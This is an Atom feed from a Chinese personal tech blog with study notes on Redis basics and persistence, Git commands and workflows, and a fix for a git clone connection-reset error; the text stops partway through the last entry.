<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小马哥的博客 | BlogSelf</title>
  
  
  <link href="http://zhizhi111.github.io/atom.xml" rel="self"/>
  
  <link href="http://zhizhi111.github.io/"/>
  <updated>2022-01-23T10:57:39.000Z</updated>
  <id>http://zhizhi111.github.io/</id>
  
  <author>
    <name>小马哥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis基础</title>
    <link href="http://zhizhi111.github.io/2022/01/23/%E5%AD%A6%E4%B9%A0Redis%E7%AC%94%E8%AE%B0/"/>
    <id>http://zhizhi111.github.io/2022/01/23/%E5%AD%A6%E4%B9%A0Redis%E7%AC%94%E8%AE%B0/</id>
    <published>2022-01-23T06:23:23.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、学习Redis基础"><a href="#一、学习Redis基础" class="headerlink" title="一、学习Redis基础"></a>一、学习Redis基础</h2><ol><li><p>在前面学习了MySQL数据库，它是一种传统的关系型数据库，我们可以使用MySQL来更好地管理和组织我们的数据，虽然在小型Web下，只需要一个MySQL+Mybatis自带的缓存系统就可以胜任大部分的数据存储工作，但是MySQL的缺点也很明显，他的数据始终是存储在硬盘上，对于我们的用户信息这种不需要经常发生修改的内容，使用MySQL确实可以，但是如果是快速更新或是频繁使用的数据，比如微博resource、双十一秒杀，这些数据不仅要求服务器需要提供更高的响应速度，而且还需要面对短时间内上百万甚至上千万次访问，而MySQL的磁盘IO读写性能完全不能满足上面的需求，能够满足上述需求的只有内存，因为速度远高于磁盘IO。</p></li><li><p>NoSQL概论<br>NoSQL全称是Not Only SQL(不仅仅是SQL) 它是一种非关系型数据库，相比传统SQL关系型数据库，它：</p></li></ol><ul><li><p>特点：</p><ol><li>不保证关系数据的ACID特性</li><li>并不遵循SQL标准</li><li>消除数据之间关联性</li></ol></li><li><p>优势：</p></li></ul><ol><li><p>远超传统关系型数据库的性能</p></li><li><p>非常易于扩展</p></li><li><p>数据模型更加灵活</p></li><li><p>高可用</p><blockquote><p>这样，NoSQL的优势就出来了，这就是我们正在寻找的高并发海量数据的解决方案。</p></blockquote></li><li><p>NoSQL数据库分为以下几种：</p></li></ol><ul><li><p>键值存储数据库：所有的数据都是以键值方式存储的，类似于HashMap，使用起来非常简单方便，性能也非常高</p></li><li><p>列存储数据库：这部分数据库通常用来应对分布式存储的海量数据。键仍然存在，但是他们的特点是指向了多个列</p></li><li><p>文档型数据库：它是以一种特定的文档格式存储数据，比如JSON格式，在处理网页等复杂数据时，文档型数据库比传统型键值数据库查询效率更高</p></li><li><p>图形数据库：利用类似于图的数据结构存储数据，结合图相关算法实现高速访问</p></li></ul><blockquote><p>Redis是一个开源的键值存储数据库，所有的数据全部存在内存中，它的性能远远高于磁盘IO，并且它也可以支持数据持久化，它还支持横向扩展、主从复制等。</p></blockquote><ol start="4"><li>Redis中键值对命令</li></ol><p>set ye 44<br>get ye</p><p>定义数据有效时间<br><code>reprie a 10 </code>  </p><ol start="5"><li>HashMap键值对<br><code>hset yecode 111</code><br><code>hset b name lbw age 10</code><br><code>hget b</code><br><code>hexists &lt;key&gt; &lt;字段&gt;   #判断某个字段是否存在</code><br><code>hdel &lt;key&gt; &lt;字段&gt;      #删除某个字段</code><br><code>hdel &lt;key&gt;             #删除hash中某个键</code></li></ol><p>我们现在想要知道Hash中一共存了多少个键值对：<code>hlen &lt;key&gt;</code></p><p>我们也可以一次性获取所有字段的值: <code>hvals &lt;key&gt;</code></p><ol start="6"><li>List<br>我们可以直接向一个已存在或是不存在的List中添加数据，如果不存在，会自动创建：<br>#向列表头部添加元素<br>lpush <key> <element><br>#向列表尾部添加元素<br>rpush <key> <element><br>#在指定元素前面/后面插入元素<br>linsert <key> before/after &lt;指定元素&gt; <element><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lpush c 111 222 333</span><br><span class="line">insert c before 222 000</span><br></pre></td></tr></table></figure>同样的获取元素也非常简单<br>#根据下表获取元素<br>lindex <key> &lt;下标&gt;<br>#获取并移除头部元素<br>lpop <key><br>#获取并移除尾部与阿奴苏<br>rpop <key><br>#获取指定范围内的<br>lrange <key>  start stop</li></ol><h2 id="二、持久化"><a href="#二、持久化" class="headerlink" title="二、持久化"></a>二、持久化</h2><ul><li><p>Redis数据库中的数据是存放在内存中的，虽然很高效，但是这样存在一个非常严重的问题，如果突然停电，或者突然关闭了终端，那数据不就全部丢失了吗？</p></li><li><p>这个时候就需要持久化，我们需要将我们的数据备份到硬盘上，防止断电或机器故障导致数据丢失</p></li></ul><ol><li>持久化实现方法有两种方案：</li></ol><ul><li>一种是直接保存当前已经存储的数据，相当于复制内存中的数据到硬盘上，需要回复数据时直接读取即可</li><li>一种是保存我们存放数据的所有过程，需要恢复数据时，只需要将整个过程完整地重演一篇就能保证与之前数据库中的内容一致。</li></ul><h3 id="1-RDB"><a href="#1-RDB" class="headerlink" title="1. RDB"></a>1. RDB</h3><p>RDB就是上述的第一种方案，保存到本地，使用以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">save</span><br><span class="line">--注意上面这个命令会直接保存，会占用一定时间，可以单独开一个子进程后台执行保存</span><br><span class="line">bgsave  </span><br><span class="line">--可以单独开一个子进程后台执行保存</span><br></pre></td></tr></table></figure><p>执行后，会在服务端目录下生成一个<code>dump.rdb</code>文件，而这个文件中就保存了内存中存放的数据，当服务器重启后，会自动加载里面的内容到对应数据库中。<br>保存后我们就可以关闭服务器<br><code>shutdown</code></p><h3 id="2-AOF"><a href="#2-AOF" class="headerlink" title="2. AOF"></a>2. AOF</h3><p>虽然RDB能够很好地解决持久化问题，但是它的缺点也很明显：每次都需要去完整地保存整个数据库中的数据，同时后台保存过程中也会产生额外的内存开销，最严重的是它不是实时保存的，如果在自动保存出发之前服务器崩溃，那么依然会导致少量数据的丢失<br>AOF就是另一种方式，它会以日志的形式将我们每次执行的命令都进行保存，服务器重启时会将所有命令依次执行，通过重演的方式将数据恢复，这样就能很好解决实时性存储问题。</p><p>但是，我们多久写一次日志呢？我们可以自己配置保存策略<br>always：每次执行写操作都会保存一次<br>everysec：每秒保存一次（默认配置）<br>no： 看系统心情</p><p>开启AOF自动记录日志功能需要在日志文件中找到oppendonly，将no改成yes</p><p>重启服务器后，可以看到服务器目录下多了一个oppendonly.aof文件，存储的就是我们执行的命令</p><p>AOF的命令也很明显，每次服务器启动都需要进行过程重演，相比RDB更加耗费时间，并且随着我们的操作变多，不断累积，到最后我们的aof文件会变得无比巨大。我们需要改进方案优化这些问题</p><p>Redis有一个AOF重写机制进行优化，比如我们执行了这样的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lpush <span class="built_in">test</span> 666</span><br><span class="line">lpush <span class="built_in">test</span> 777</span><br><span class="line">lpush <span class="built_in">test</span> 888</span><br></pre></td></tr></table></figure><p>实际上用一条语句也可以实现<br><code>lpush test 666 777 888</code><br>正是如此，只要我们能够保证最终的重演结果和原有语句的结果一致，无论语句如何修改都可以，所以我们可以通过这种方式将多余语句进行压缩</p><ol><li>我们可以输入命令来手动执行重写操作<br><code>bgrewiteof</code></li><li>或是在配置文件中配置自动重写<br>百分比配置文件中配置自动重写：<br><code>auto-aof-rewrite-percentage 100</code><br>当达到这个大小时，触发自动重写：<br><code>a</code>oto-aof-rewrite-min-size 64mb`<br>至此，两种持久化方案介绍结束，最后进行总结</li></ol><h3 id="两种方案优缺点"><a href="#两种方案优缺点" class="headerlink" title="两种方案优缺点"></a>两种方案优缺点</h3><ul><li><code>RDB</code>：<br>优点：加载速度快、数据体积小<br>缺点：存储速度慢大量消耗资源、会发生数据丢失</li></ul><ul><li><code>AOF</code>：<br>有点：存储速度快，消耗资源少、支持实时存储<br>缺点：加载速度慢、数据体积大</li></ul><h2 id="三、Redis中事物和锁机制"><a href="#三、Redis中事物和锁机制" class="headerlink" title="三、Redis中事物和锁机制"></a>三、Redis中事物和锁机制</h2><h3 id="1-事物机制："><a href="#1-事物机制：" class="headerlink" title="1. 事物机制："></a>1. 事物机制：</h3><ul><li>和MySQL一样，在Redis中也有事物机制，当我们需要保证多余命令一次性完执行而中途不受其他命令干扰时，就可以使用事物机制。</li></ul><ol><li>我们可以使用明里阿尼过来直接开启事物：<br><code>multi</code></li><li>当我们输入完所有要执行的命令，可以使用命令来立即执行事物：<br><code>exec</code></li><li>我们也可以中途取消事物：<br><code>discard</code></li></ol><ul><li>实际上整个事物是创建了一个命令队列，它不像MySQL那种在事物中也能单独得到结果，而是我们提前将所有的命令装在队列中，但是并不会执行，而是等我们提交事务的时候再统一执行。</li></ul><h3 id="2-锁："><a href="#2-锁：" class="headerlink" title="2. 锁："></a>2. 锁：</h3><ul><li><p>又提到锁了，实际上这个概念对我来说已经不算陌生了。实际上在Redis中也会出现多个命令竞争同一个数据的情况，比如现在有两条命令同时执行，他们都要去修改a的值，那么这个时候就只能动用锁机制来保证同一时间只能有一个命令操作。</p></li><li><p>虽然Redis中也有锁机制，但是它是一种乐观锁，不同于MySQL，我们在MySQL中认识的锁是悲观锁。</p></li></ul><ol><li><p>悲观锁：时刻认为别人会来抢占资源，禁止一切外来访问，直到释放锁，具有强烈的排他性质</p></li><li><p>乐观锁：并不认为会有人来抢占资源，所以会直接对数据进行操作，在操作时再去验证是否有其它人抢占资源</p></li></ol><ul><li>Redis中可以使用watch来监视一个目标，如果执行事务之前被监视目标发生了修改，则取消本次事物：<br><code>watch</code></li></ul><h2 id="四、使用Java与Redis交互"><a href="#四、使用Java与Redis交互" class="headerlink" title="四、使用Java与Redis交互"></a>四、使用Java与Redis交互</h2><p>既然了解如何通过命令窗口操作Redis数据库，那么我们如何使用java来操作呢？<br>这里我们需要使用Jedis框架，他能够实现Java与Redis数据库交互，导入依赖：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;groupId&gt;&lt;redis.clients&gt;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">&lt;version&gt;4.0.0&lt;/version&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、学习Redis基础&quot;&gt;&lt;a href=&quot;#一、学习Redis基础&quot; class=&quot;headerlink&quot; title=&quot;一、学习Redis基础&quot;&gt;&lt;/a&gt;一、学习Redis基础&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在前面学习了MySQL数据库，它是一种传统的关系型</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Redis" scheme="http://zhizhi111.github.io/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Layui-模块化前端UI框架</title>
    <link href="http://zhizhi111.github.io/2022/01/23/Layui-%E6%A8%A1%E5%9D%97%E5%8C%96%E5%89%8D%E7%AB%AFUI%E6%A1%86%E6%9E%B6/"/>
    <id>http://zhizhi111.github.io/2022/01/23/Layui-%E6%A8%A1%E5%9D%97%E5%8C%96%E5%89%8D%E7%AB%AFUI%E6%A1%86%E6%9E%B6/</id>
    <published>2022-01-23T01:34:22.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>学习Git版本控制笔记</title>
    <link href="http://zhizhi111.github.io/2022/01/22/%E5%AD%A6%E4%B9%A0Git%E7%AC%94%E8%AE%B0/"/>
    <id>http://zhizhi111.github.io/2022/01/22/%E5%AD%A6%E4%B9%A0Git%E7%AC%94%E8%AE%B0/</id>
    <published>2022-01-22T04:04:44.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Git工作流"><a href="#一、Git工作流" class="headerlink" title="一、Git工作流"></a>一、Git工作流</h2><p><img src="https://s2.loli.net/2022/01/22/VWYkdFjNil5A6L1.jpg" alt="1.jpg"></p><h3 id="四大板块"><a href="#四大板块" class="headerlink" title="四大板块"></a>四大板块</h3><h4 id="1-工作目录"><a href="#1-工作目录" class="headerlink" title="(1)工作目录"></a>(1)工作目录</h4><p>存放我们正在写的代码</p><h4 id="2-暂存区"><a href="#2-暂存区" class="headerlink" title="(2)暂存区"></a>(2)暂存区</h4><p>暂时保存待提交的内容</p><h4 id="3-本地仓库"><a href="#3-本地仓库" class="headerlink" title="(3)本地仓库"></a>(3)本地仓库</h4><p>位于我们电脑上的一个版本控制仓库</p><h4 id="4-远程仓库"><a href="#4-远程仓库" class="headerlink" title="(4)远程仓库"></a>(4)远程仓库</h4><p>位于服务器上的版本控制仓库</p><h2 id="二、创建本地仓库"><a href="#二、创建本地仓库" class="headerlink" title="二、创建本地仓库"></a>二、创建本地仓库</h2><h3 id="2-1初始化为本地仓库"><a href="#2-1初始化为本地仓库" class="headerlink" title="2.1初始化为本地仓库"></a>2.1初始化为本地仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init   <span class="comment">#可以创建多个本地仓库</span></span><br></pre></td></tr></table></figure><h3 id="2-2查看当前仓库状态"><a href="#2-2查看当前仓库状态" class="headerlink" title="2.2查看当前仓库状态"></a>2.2查看当前仓库状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status     <span class="comment">#查看当前，如果有未追踪的文件则需要追踪</span></span><br></pre></td></tr></table></figure><h3 id="2-3添加为追踪文件"><a href="#2-3添加为追踪文件" class="headerlink" title="2.3添加为追踪文件"></a>2.3添加为追踪文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add text.txt      <span class="comment">#添加完成就放到了暂存区等待提交</span></span><br></pre></td></tr></table></figure><h3 id="2-4这提交到本地仓库"><a href="#2-4这提交到本地仓库" class="headerlink" title="2.4这提交到本地仓库"></a>2.4这提交到本地仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&#x27;描述&#x27;</span>    <span class="comment">#这个版本就提交到git的本地仓库了</span></span><br></pre></td></tr></table></figure><h3 id="2-5修改文件内容提交"><a href="#2-5修改文件内容提交" class="headerlink" title="2.5修改文件内容提交"></a>2.5修改文件内容提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -a -m <span class="string">&#x27;备注&#x27;</span>   <span class="comment">#如果修改了已经提交过的文件内容，再次提交就使用这个命令</span></span><br></pre></td></tr></table></figure><h3 id="2-6查看提交日志"><a href="#2-6查看提交日志" class="headerlink" title="2.6查看提交日志"></a>2.6查看提交日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span>    <span class="comment">#可以查看提交日志，谁在什么时候提交的，也能查看提交ID</span></span><br></pre></td></tr></table></figure><h3 id="2-7查看一条日志"><a href="#2-7查看一条日志" class="headerlink" title="2.7查看一条日志"></a>2.7查看一条日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --all --oneline --graph   <span class="comment">#图形化查看一条日志的所有操作</span></span><br></pre></td></tr></table></figure><h3 id="2-8改变初始化提交"><a href="#2-8改变初始化提交" class="headerlink" title="2.8改变初始化提交"></a>2.8改变初始化提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard conmmitID   <span class="comment">#改变初始化提交为哪一次提交的版本</span></span><br></pre></td></tr></table></figure><h3 id="2-9查看所有分支的所有操作记录"><a href="#2-9查看所有分支的所有操作记录" class="headerlink" title="2.9查看所有分支的所有操作记录"></a>2.9查看所有分支的所有操作记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog       <span class="comment">#查看所有分支的所有操作记录 </span></span><br></pre></td></tr></table></figure><h2 id="三、新建分支"><a href="#三、新建分支" class="headerlink" title="三、新建分支"></a>三、新建分支</h2><h3 id="3-1查看当前所在分支"><a href="#3-1查看当前所在分支" class="headerlink" title="3.1查看当前所在分支"></a>3.1查看当前所在分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure><h3 id="3-2创建新的分支"><a href="#3-2创建新的分支" class="headerlink" title="3.2创建新的分支"></a>3.2创建新的分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch 分支名 </span><br></pre></td></tr></table></figure><h3 id="3-3删除分支"><a href="#3-3删除分支" class="headerlink" title="3.3删除分支"></a>3.3删除分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d 分支名</span><br></pre></td></tr></table></figure><h3 id="3-4切换分支"><a href="#3-4切换分支" class="headerlink" title="3.4切换分支"></a>3.4切换分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout 分支名   </span><br></pre></td></tr></table></figure><h2 id="四、合并分支"><a href="#四、合并分支" class="headerlink" title="四、合并分支"></a>四、合并分支</h2><p>我们也可以将两个分支更新的内容最终合并到同一个分支上<br>我们先切换回主分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure><p>然后合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge 分支名   </span><br></pre></td></tr></table></figure><p>如果合并有冲突，查看哪里发生了冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff  </span><br></pre></td></tr></table></figure><h2 id="五、变基分支"><a href="#五、变基分支" class="headerlink" title="五、变基分支"></a>五、变基分支</h2><p>除了直接合并分支，我们还可以进行变基操作，它跟合并不同，合并是分支回到主干的过程，而变基是直接修改分支开始的位置，比如我们希望将text变基到master上，那么test会将分支起点移动到master最后一次提交位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase master</span><br></pre></td></tr></table></figure><p>变基后，test分支相当于同步了此前master分支的全部提交</p><h2 id="六、优选"><a href="#六、优选" class="headerlink" title="六、优选"></a>六、优选</h2><p>我们还可以选择其它分支上的提交作用于当前分支，这种操作称为cherrypick</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout test   #先切换到test分支</span><br><span class="line">git cherry-pick &lt;commit ID&gt;   #单独合并一个提交</span><br></pre></td></tr></table></figure><p>这里我们在master分支上创建一个新的文件，提交此次更新，接着通过cherry-pick的方式将此次更新作用于test分支上。</p><h2 id="七、使用IDEA版本控制"><a href="#七、使用IDEA版本控制" class="headerlink" title="七、使用IDEA版本控制"></a>七、使用IDEA版本控制</h2><p>虽然前面学习了git命令行的使用方法，但是没有一个图形化界面，始终会感觉很抽象，所有再继续学习使用IDEA的版本控制</p><p>打开IDEA后，找到版本控制模块，我们直接点击创建本地仓库，它会自动将当前项目的根目录作为我们的本地仓库，当我们编写的所有代码和项目目录下其它文件都可以进行版本控制</p><p>我发现所有项目中正在编写的类文件全部变红了，也就是处于未追踪状态，接着我进行第一次初始化提交，提交之后我可以在下方看到所有本地仓库提交记录</p><p>接着我来整合一下Web环境，创建新的类之后，IDEA会提示我们是否将文件添加Git，也就是是否放入暂存区并开启追踪，我们可以直接对比两次代码的相同和不同之处。</p><h2 id="八、远程仓库"><a href="#八、远程仓库" class="headerlink" title="八、远程仓库"></a>八、远程仓库</h2><h3 id="8-1-远程仓库概述"><a href="#8-1-远程仓库概述" class="headerlink" title="8.1 远程仓库概述"></a>8.1 远程仓库概述</h3><p>远程仓库实绩上就是位于服务器上的仓库，它能在远端保存我们的版本历史，并且实现多人同时合作编写项目，每个人都能够同步他人的版本，能够看到他人的版本提交，相当于将我们的代码放在服务器上进行托管。</p><h3 id="8-2-Github和Bitbacket"><a href="#8-2-Github和Bitbacket" class="headerlink" title="8.2 Github和Bitbacket"></a>8.2 Github和Bitbacket</h3><p>托管 Git 仓库最受欢迎的网站是 GitHub 和Bitbucket。：GitHub 为开源项目提供无限量的免费仓库,但私有仓库收费;而 Bitbucket 提供了无限量的私有仓库,仅当协作者超过一定数量时才收费。选择哪个网站,取决于具体的需求。在学习ruby on rails的教程中作者将代码托管在了Bitbucket上面，所以我也申请了一个账号试试。觉得用户体验还是很棒的。跟github很像，界面也十分友好。这是一个免费托管私人仓库的好地方。</p><h3 id="8-3-公有和私有远程仓库"><a href="#8-3-公有和私有远程仓库" class="headerlink" title="8.3 公有和私有远程仓库"></a>8.3 公有和私有远程仓库</h3><p>远程仓库有公有和私有的，公有的远程仓库有GitHub，码云，Coding等，他们都是对外开放的，我们注册账号之后就可以使用远程仓库进行版本控制，其中最大的就是GitHub，但是它服务器在国外，国内链接可能会有一点卡。私有一般是GitLab这种自主搭建的远程私服，在公司中比较常用，我们公司的项目就是托管在GitLab上，使用局域网搭建的一个远程仓库，它只对公司内部开放，不对外开放。</p><h3 id="8-9-将自己的项目conmmit到本地仓库以后push到远程仓库"><a href="#8-9-将自己的项目conmmit到本地仓库以后push到远程仓库" class="headerlink" title="8.9 将自己的项目conmmit到本地仓库以后push到远程仓库"></a>8.9 将自己的项目conmmit到本地仓库以后push到远程仓库</h3><h3 id="1、完成本地提交"><a href="#1、完成本地提交" class="headerlink" title="1、完成本地提交"></a>1、完成本地提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git commit -a -m <span class="string">&#x27;提交描述&#x27;</span></span><br><span class="line">git <span class="built_in">log</span> --oneline --all --graph</span><br></pre></td></tr></table></figure><h3 id="2、让本地仓库知道远程仓库的存在-本地仓库绑定远程仓库"><a href="#2、让本地仓库知道远程仓库的存在-本地仓库绑定远程仓库" class="headerlink" title="2、让本地仓库知道远程仓库的存在(本地仓库绑定远程仓库)"></a>2、让本地仓库知道远程仓库的存在(本地仓库绑定远程仓库)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https地址  </span><br></pre></td></tr></table></figure><h3 id="3、push到远程仓库"><a href="#3、push到远程仓库" class="headerlink" title="3、push到远程仓库"></a>3、push到远程仓库</h3><p>语法格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push 远程仓库分支 本地分支名称</span><br></pre></td></tr></table></figure><p>具体命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin maser</span><br></pre></td></tr></table></figure><h3 id="4、本地绑定远程"><a href="#4、本地绑定远程" class="headerlink" title="4、本地绑定远程"></a>4、本地绑定远程</h3><p>我们可以将远端和本地的分支进行绑定，绑定后就不需要指定分支名称了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git Push--set-upstream yecode master:master</span><br><span class="line">git push yecode</span><br></pre></td></tr></table></figure><p>在一个本地仓库对应一个远程仓库的下，远程仓库基本上就是纯粹的代码托管了，类似于云盘那种感觉，存你的代码。</p><h2 id="九、克隆项目"><a href="#九、克隆项目" class="headerlink" title="九、克隆项目"></a>九、克隆项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https地址</span><br></pre></td></tr></table></figure><h2 id="十、抓取、拉取和冲突解决"><a href="#十、抓取、拉取和冲突解决" class="headerlink" title="十、抓取、拉取和冲突解决"></a>十、抓取、拉取和冲突解决</h2><p>比如程序员A完成了他的模块，那么他就可以提交代码并推送到远程仓库，这时程序员B也要开始写代码了，由于远程仓库有其他程序员提交的记录，因此程序员B的本地仓库就和远程仓库不一致，就需要先进行pull操作，获取远程仓库最新的提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch   <span class="comment">#抓取：只获取但是不会合并远端分支，后面需要我们手动合并并提交</span></span><br><span class="line">git pull     <span class="comment">#拉取：获取+合并</span></span><br></pre></td></tr></table></figure><p>如果存在不协调的地方，比如本地有两个仓库，一个仓库去修改hello.txt并直接提交，另一个仓库也修改hexllo.txt并直接提交，会报错</p><p>一旦一一个本地仓库推送了代码，那么另一个本地仓库的推送会被拒绝，原因是当前文件已经被其他的推送给修改了，我们这边相当于是另一个版本，和之前两个分支合并一样，产生了冲突，因此我们只能去解决冲突问题。</p><p>如果远程仓库中的提交和本地仓库的提交没有去编写同一个文件，那么就可以直接拉取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull 远程仓库</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、Git工作流&quot;&gt;&lt;a href=&quot;#一、Git工作流&quot; class=&quot;headerlink&quot; title=&quot;一、Git工作流&quot;&gt;&lt;/a&gt;一、Git工作流&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/22/VWYkd</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Git" scheme="http://zhizhi111.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot整合Mybatis</title>
    <link href="http://zhizhi111.github.io/2022/01/19/Spring-Boot%E6%95%B4%E5%90%88Mybatis/"/>
    <id>http://zhizhi111.github.io/2022/01/19/Spring-Boot%E6%95%B4%E5%90%88Mybatis/</id>
    <published>2022-01-19T01:33:22.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>关于git clone报10054错误</title>
    <link href="http://zhizhi111.github.io/2022/01/16/%E5%85%B3%E4%BA%8Egit-clone%E6%8A%A510054%E9%94%99%E8%AF%AF/"/>
    <id>http://zhizhi111.github.io/2022/01/16/%E5%85%B3%E4%BA%8Egit-clone%E6%8A%A510054%E9%94%99%E8%AF%AF/</id>
    <published>2022-01-16T04:58:31.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="git-clone-url-git-报10054错误，具体错误如下："><a href="#git-clone-url-git-报10054错误，具体错误如下：" class="headerlink" title="git clone url.git 报10054错误，具体错误如下："></a>git clone url.git 报10054错误，具体错误如下：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator@PC202006091958 MINGW64 /d/GitHub_clone/themes</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/blinkfox/hexo-theme-matery.git <span class="comment">#这是git命令</span></span><br><span class="line">Cloning into <span class="string">&#x27;hexo-theme-matery&#x27;</span>...</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/blinkfox/hexo-theme-matery.git/&#x27;</span>: OpenSSL SSL_read: Connection was reset, errno 10054</span><br></pre></td></tr></table></figure><h2 id="解决方法一"><a href="#解决方法一" class="headerlink" title="解决方法一"></a>解决方法一</h2><h3 id="执行以下两行代码即可："><a href="#执行以下两行代码即可：" class="headerlink" title="执行以下两行代码即可："></a>执行以下两行代码即可：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h2 id="再次git-克隆即成功，-如下图"><a href="#再次git-克隆即成功，-如下图" class="headerlink" title="再次git 克隆即成功， 如下图"></a>再次git 克隆即成功， 如下图</h2><p><img src="https://s2.loli.net/2022/01/16/KD1WE2UotRcPXSY.png" alt="7.png"></p><h2 id="解决方法二"><a href="#解决方法二" class="headerlink" title="解决方法二"></a>解决方法二</h2><h3 id="当解决方法一不能解决报错问题时，手动配置git的代理，git客户端输入以下命令"><a href="#当解决方法一不能解决报错问题时，手动配置git的代理，git客户端输入以下命令" class="headerlink" title="当解决方法一不能解决报错问题时，手动配置git的代理，git客户端输入以下命令"></a>当解决方法一不能解决报错问题时，手动配置git的代理，git客户端输入以下命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 